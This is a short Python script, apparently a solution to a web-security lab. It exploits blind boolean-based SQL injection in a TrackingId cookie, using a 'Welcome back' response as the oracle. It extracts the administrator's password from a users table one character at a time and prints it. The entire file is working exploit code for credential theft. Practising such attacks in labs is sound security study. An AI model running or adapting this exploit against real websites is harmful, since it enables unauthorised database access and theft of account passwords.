import requests

url = "/filter"
base = ""

def is_true(condition):
    headers = {"Cookie":"TrackingId=" + base + "' AND " + condition}
    r = requests.get(url, params={"category": "Accessories"}, headers=headers)
    return "Welcome back" in r.text

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for pos in range(1,21):
    for ch in alphabet:
        cond = f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{ch}"
        if is_true(cond):
            password += ch
            print(pos, ch, "->",password)
            break

print("PASSWORD:", password)